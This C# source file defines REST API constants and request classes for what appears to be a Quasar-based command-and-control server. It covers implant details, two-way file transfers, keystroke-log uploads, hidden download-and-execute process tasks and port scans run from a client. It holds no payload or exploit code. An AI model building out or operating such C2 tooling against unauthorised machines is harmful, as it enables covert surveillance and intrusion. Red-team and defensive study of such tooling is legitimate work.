using System;

namespace Quasar.Server.RestApiConstants
{
    public static class RestConstants
    {
        // Implant information
        public const string CLIENT_ID_FIELD = "id";
        public const string CLIENT_USERNAME_FIELD = "username";
        public const string CLIENT_HOSTNAME_FIELD = "hostname";
        public const string CLIENT_IP_ADDR_FIELD = "ip_addr";
        public const string CLIENT_OS_FIELD = "os";
        public const string CLIENT_ACCOUNT_TYPE_FIELD = "account_type";
        public const string CLIENT_TAG_FIELD = "tag";
        public const string CLIENT_COUNTRY_FIELD = "country_code";
        public const string CLIENT_HARDWARE_ID_FIELD = "hardware_id";

        // Regular file transfers
        public const string TRANSFER_ID_FIELD = "id";
        public const string TRANSFER_TYPE_FIELD = "type";
        public const string TRANSFER_SIZE_FIELD = "size";
        public const string TRANSFER_TRANSFERRED_SIZE_FIELD = "transferred_size";
        public const string TRANSFER_LOCAL_PATH_FIELD = "local_path";
        public const string TRANSFER_REMOTE_PATH_FIELD = "remote_path";
        public const string TRANSFER_STATUS_MSG_FIELD = "status_msg";
        public const string TRANSFER_STATUS_CODE_FIELD = "status";

        public const int TRANSFER_TYPE_SERVER_TO_CLIENT = 0;
        public const int TRANSFER_TYPE_CLIENT_TO_SERVER = 1;

        // Keystroke log file uploads
        public const string KEYLOG_UPLOAD_TASK_ID_FIELD = "task_id";
        public const string KEYLOG_UPLOAD_STATUS_CODE_FIELD = "status";
        public const string KEYLOG_UPLOAD_STATUS_MSG_FIELD = "status_msg";
        public const string KEYLOG_UPLOAD_STATUS_ERR_MSG_FIELD = "status_err_msg";
        public const string KEYLOG_UPLOAD_TRANSFER_IDS_FIELD = "transfer_ids";

        // General tasks
        public const string TASK_ID_FIELD = "task_id";
        public const string TASK_TYPE_FIELD = "task_type";
        public const string TASK_STATUS_FIELD = "task_status";
        public const string TASK_STATUS_MSG_FIELD = "task_status_msg";

        // Process creation tasks
        public const string BINARY_PATH_FIELD = "proc_path";
        public const string PROCESS_ARGS_FIELD = "proc_args";
        public const string DOWNLOAD_URL_FIELD = "download_url";
        public const string DOWNLOAD_DEST_PATH_FIELD = "download_dst";
        public const string USE_SHELL_EXEC_FIELD = "use_shell";
        public const string CAPTURE_OUTPUT_FIELD = "get_output";
        public const string NO_WINDOW_FIELD = "no_window";
        public const string PROCESS_PID_FIELD = "pid";
        public const string PROCESS_EXIT_CODE_FIELD = "exit_code";
        public const string PROCESS_STDOUT_FIELD = "stdout";
        public const string PROCESS_STDERR_FIELD = "stderr";

        // Port scan task
        public const string PORT_SCAN_TARGET_RANGE_FIELD = "range";
        public const string PORT_SCAN_TARGET_PORTS_FIELD = "ports";
        public const string PORT_SCAN_RESULTS_FIELD = "result";
    }

    // Represents API request for tasking a file transfer
    public class FileTransferApiRequest
    {
        public string ClientId { get; set; }

        public int TransferType { get; set; }

        public string SourcePath { get; set; }

        public string DestPath { get; set; }

        public const string CLIENT_ID_FIELD_NAME = "client_id";
        public const string TRANSFER_TYPE_FIELD_NAME = "type";
        public const string SOURCE_PATH_FIELD_NAME = "source";
        public const string DEST_PATH_FIELD_NAME = "dest";
    }

    public class KeystrokeLogUploadApiRequest
    {
        public string ClientId { get; set; }

        public const string CLIENT_ID_FIELD_NAME = "client_id";
    }

    // Represents API request for tasking a process execution
    public class ExecuteProcessApiRequest
    {
        public string ClientId { get; set; }

        public string BinaryPath { get; set; }

        public string ProcessArgs { get; set; }

        public string DownloadUrl { get; set; }

        public string DownloadDestPath { get; set; }

        public bool UseShellExecute { get; set; }

        public bool CaptureOutput { get; set; }
        
        public bool NoWindow { get; set; }

        public const string CLIENT_ID_FIELD_NAME = "client_id";
        public const string BINARY_PATH_FIELD_NAME = "proc_path";
        public const string PROCESS_ARGS_FIELD_NAME = "proc_args";
        public const string DOWNLOAD_URL_FIELD_NAME = "download_url";
        public const string DOWNLOAD_DEST_PATH_FIELD_NAME = "download_dst";
        public const string USE_SHELL_EXEC_FIELD_NAME = "use_shell";
        public const string CAPTURE_OUTPUT_FIELD_NAME = "get_output";
        public const string NO_WINDOW_FIELD_NAME = "no_window";

        public override string ToString()
        {
            return String.Format(
                "Client ID: {0}, Process path: {1}, Process args: {2}, Download url: {3}, Download dest path: {4}, Use shell execute: {5}, Get output: {6}, No window: {7}",
                ClientId,
                BinaryPath,
                ProcessArgs,
                DownloadUrl,
                DownloadDestPath,
                UseShellExecute,
                CaptureOutput,
                NoWindow
            );
        }
    }

    // Represents API request for tasking a port scan
    public class PortScanApiRequest
    {
        public string ClientId { get; set; }

        public string TargetRange { get; set; }

        public int[] TargetPorts { get; set; }

        public const string CLIENT_ID_FIELD_NAME = "client_id";
        public const string TARGET_RANGE_FIELD_NAME = "range";
        public const string TARGET_PORTS_FIELD_NAME = "ports";


        public override string ToString()
        {
            return String.Format(
                "Client ID: {0}, Target range: {1}, Target ports: {2}",
                ClientId,
                TargetRange,
                String.Join(", ", TargetPorts)
            );
        }
    }
}